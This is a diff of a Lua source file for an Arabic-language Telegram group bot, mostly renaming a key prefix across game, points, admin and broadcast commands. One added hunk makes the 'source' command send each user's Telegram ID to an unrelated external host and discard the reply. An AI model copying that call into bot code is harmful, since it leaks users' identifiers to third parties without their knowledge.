 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
-DevALI:setex(Jenral.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
+DevALI:setex(JENRAL.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
 return false  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'روليت' then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
-DevALI:del(Jenral.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
-DevALI:del(Jenral..'ALI:ListRolet'..msg.chat_id_)  
-DevALI:setex(Jenral.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
+DevALI:del(JENRAL.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'ALI:ListRolet'..msg.chat_id_)  
+DevALI:setex(JENRAL.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
 return false  
 end
 end
-if text and text:match("^(%d+)$") and DevALI:get(Jenral.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
+if text and text:match("^(%d+)$") and DevALI:get(JENRAL.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
 if text == "1" then
 Text = "⌁︙لا استطيع بدء اللعبه بلاعب واحد فقط"
 else
-DevALI:set(Jenral.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
+DevALI:set(JENRAL.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
 Text = '⌁︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⌁︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
 end
-DevALI:del(Jenral.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:StartRolet"..msg.chat_id_..msg.sender_user_id_)
 send(msg.chat_id_,msg.id_,Text)
 return false
 end
-if text and text:match('^(@[%a%d_]+)$') and DevALI:get(Jenral.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
-if DevALI:sismember(Jenral..'ALI:ListRolet'..msg.chat_id_,text) then
+if text and text:match('^(@[%a%d_]+)$') and DevALI:get(JENRAL.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
+if DevALI:sismember(JENRAL..'ALI:ListRolet'..msg.chat_id_,text) then
 send(msg.chat_id_,msg.id_,'⌁︙المعرف ↫ ['..text..'] موجود اساسا')
 return false
 end
@@ -3953,13 +3953,13 @@ if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
 return false 
 end
-DevALI:sadd(Jenral..'ALI:ListRolet'..msg.chat_id_,text)
-local CountAdd = DevALI:get(Jenral.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_)
-local CountAll = DevALI:scard(Jenral..'ALI:ListRolet'..msg.chat_id_)
+DevALI:sadd(JENRAL..'ALI:ListRolet'..msg.chat_id_,text)
+local CountAdd = DevALI:get(JENRAL.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_)
+local CountAll = DevALI:scard(JENRAL..'ALI:ListRolet'..msg.chat_id_)
 local CountUser = CountAdd - CountAll
 if tonumber(CountAll) == tonumber(CountAdd) then 
-DevALI:del(Jenral.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
-DevALI:setex(Jenral.."ALI:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
+DevALI:del(JENRAL.."ALI:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:setex(JENRAL.."ALI:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
 local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."]\n⌁︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
@@ -3973,22 +3973,22 @@ Msg_id = msg.id_/2097152/0.5
 return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end,nil) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'كت تويت' and SourceCh(msg) or text == 'كت' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
-local JenralTEAM = {
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
+local JENRALTEAM = {
 'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟',
 'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
 'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
 'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟'
 }  
-Dev_ALI(msg.chat_id_, msg.id_, 1, ''..JenralTEAM[math.random(#JenralTEAM)]..'' , 1, 'md')  
+Dev_ALI(msg.chat_id_, msg.id_, 1, ''..JENRALTEAM[math.random(#JENRALTEAM)]..'' , 1, 'md')  
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == 'الالعاب' or text == 'العاب' or text == 'اللعبه') and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1,[[
 ⌁︙قائمة العاب المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -4015,38 +4015,38 @@ else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطله في المجموعه', 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'بيع نقاطي' and ChCheck(msg) then
-if tonumber((DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
 else
-DevALI0 = (DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
-DevALI:incrby(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevALI0)
-Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
-DevALI:del(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
+DevALI0 = (DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
+DevALI:incrby(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevALI0)
+Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
+DevALI:del(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
 local num = 0
 local admins = abbas.members_  
 for i=0 , #admins do   
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
 num = num + 1
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
 if dp.first_name_ == false then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
 end
 end,nil)   
 else
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)   
 end 
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
 Manager_id = admins[i].user_id_  
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,Manager_id)  
-DevALI:sadd(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,Manager_id)   
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,Manager_id)  
+DevALI:sadd(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,Manager_id)   
 end  
 end  
 if num == 0 then
@@ -4056,17 +4056,17 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم رفع '..num..' من الادمن
 end
 end,nil) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'غادر' and SudoBot(msg) then
-if DevALI:get(Jenral.."ALI:Left:Bot"..Jenral) and not SecondSudo(msg) then
+if DevALI:get(JENRAL.."ALI:Left:Bot"..JENRAL) and not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
 return false  
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعه \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
-ChatLeave(msg.chat_id_, Jenral)
-DevALI:srem(Jenral.."ALI:Groups",msg.chat_id_)
+ChatLeave(msg.chat_id_, JENRAL)
+DevALI:srem(JENRAL.."ALI:Groups",msg.chat_id_)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text ==('موقعي') and ChCheck(msg) then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
 if da.status_.ID == "ChatMemberStatusCreator" then
@@ -4079,13 +4079,13 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙موقعك ↫ '..rtpa, 1, 'md')
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "معلوماتي" and ChCheck(msg) then
 function get_me(extra,result,success)
-local msguser = tonumber(DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local cont = (tonumber(DevALI:get(Jenral..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local user_nkt = tonumber(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
+local msguser = tonumber(DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local cont = (tonumber(DevALI:get(JENRAL..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local user_nkt = tonumber(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
 if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
 if result.last_name_ then lastname = result.last_name_ else lastname = '' end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgs(msguser)..'\n⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
@@ -4093,12 +4093,12 @@ end
 getUser(msg.sender_user_id_,get_me)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevALI:setex(Jenral..'DevALI4'..msg.sender_user_id_,360,true)
+DevALI:setex(JENRAL..'DevALI4'..msg.sender_user_id_,360,true)
 send(msg.chat_id_, msg.id_, '⌁︙ارسل لي معرف قناة الاشتراك الان')
 end
 return false  
@@ -4107,12 +4107,12 @@ if text == "تفعيل الاشتراك الاجباري" then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-if DevALI:get(Jenral..'ALI:ChId') then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(Jenral.."ALI:ChId"))
+if DevALI:get(JENRAL..'ALI:ChId') then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(JENRAL.."ALI:ChId"))
 local GetInfo = JSON.decode(Check)
 send(msg.chat_id_, msg.id_,"⌁︙الاشتراك الاجباري مفعل \n⌁︙على القناة ↫ [@"..GetInfo.result.username.."]")
 else
-DevALI:setex(Jenral..'DevALI4'..msg.sender_user_id_,360,true)
+DevALI:setex(JENRAL..'DevALI4'..msg.sender_user_id_,360,true)
 send(msg.chat_id_, msg.id_,"⌁︙لاتوجد قناة لتفعيل الاشتراك\n⌁︙ارسل لي معرف قناة الاشتراك الان")
 end
 end
@@ -4122,9 +4122,9 @@ if text == "تعطيل الاشتراك الاجباري" then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:ChId')
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:ChId')
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 return false  
 end
@@ -4132,14 +4132,14 @@ if text == "حذف قناة الاشتراك" or text == "حذف قناه الا
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:ChId')
+DevALI:del(JENRAL..'ALI:ChId')
 Dev_ALI(msg.chat_id_, msg.id_, 1,"⌁︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
 end
 end
 if SecondSudo(msg) then
 if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
-if DevALI:get(Jenral..'ALI:ChId') then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(Jenral.."ALI:ChId"))
+if DevALI:get(JENRAL..'ALI:ChId') then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(JENRAL.."ALI:ChId"))
 local GetInfo = JSON.decode(Check)
 send(msg.chat_id_, msg.id_, "⌁︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
 else
@@ -4147,120 +4147,119 @@ send(msg.chat_id_, msg.id_, "⌁︙لاتوجد قناة في الاشتراك �
 end
 return false  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if SudoBot(msg) then
 if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
-function JenralTEAM(extra,result,success)
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+function JENRALTEAM(extra,result,success)
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-local GpList = DevALI:smembers(Jenral.."ALI:Groups")
+local GpList = DevALI:smembers(JENRAL.."ALI:Groups")
 for k,v in pairs(GpList) do
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end
-local PvList = DevALI:smembers(Jenral.."ALI:Users")
+local PvList = DevALI:smembers(JENRAL.."ALI:Users")
 for k,v in pairs(PvList) do
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n⌁︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
 end
-getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),JenralTEAM)
+getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),JENRALTEAM)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
-DevALI:set(Jenral..'ALI:viewget'..msg.sender_user_id_,true)
+DevALI:set(JENRAL..'ALI:viewget'..msg.sender_user_id_,true)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
 end
---     Source Jenral     --
-if text == "السورس" or text == "سورس" then 
-local text =  [[
-Welcome To Source
-➣︙ᴊᴇɴʀᴀʟ TEAM
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-➣︙[ᴊᴇɴʀᴀʟ Channel](https://t.me/GENRALTEAM)
-
-➣︙[info Source](https://t.me/IIIIIIII_8)
-
-➣︙[Dev ᴊᴇɴʀᴀʟ](https://t.me/QvQvQvQ)
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-➣︙[Tws ᴊᴇɴʀᴀʟ](https://t.me/Ialusbot)
-]]
-Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+--     Source JENRAL     --
+if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
+Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@GENRALTEAM]', 1, 'md')    
+end 
+if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
+local url,res = https.request('https://vvvzvv.ml/apiteland/Teland.php?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+Text = "𓅛 ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ ᴊᴇɴʀᴀʟ \n\n[𖤓│ᴊᴇɴʀᴀʟ ᴄʜᴀɴɴᴇʟ](http://t.me/GENRALTEAM)\n\n[𖤓│ɪɴғᴏ sᴏᴜʀᴄᴇ](http://t.me/IIIIIIII_8)\n\n[𖤓│ᴊᴇɴʀᴀʟ ᴅᴇᴠᴇʟᴏᴘᴇʀ](http://t.me/QvQvQvQ)\n\n[𖤓│ᴛᴡ ʙᴏᴛ ](http://t.me/Ialusbot)"
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𓅛︙ᴊᴇɴʀᴀʟ ѕᴏụʀᴄᴇ',url="t.me/venom_source"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/venom_source&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
-if DevALI:get(Jenral.."ALI:Kick:Me"..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Kick:Me"..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
 return false
 end
-DevALI:set(Jenral..'yes'..msg.sender_user_id_, 'delyes')
-DevALI:set(Jenral..'no'..msg.sender_user_id_, 'delno')
+DevALI:set(JENRAL..'yes'..msg.sender_user_id_, 'delyes')
+DevALI:set(JENRAL..'no'..msg.sender_user_id_, 'delno')
 local Text = '⌁︙هل انت متأكد من المغادره'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
 Msg_id = msg.id_/2097152/0.5
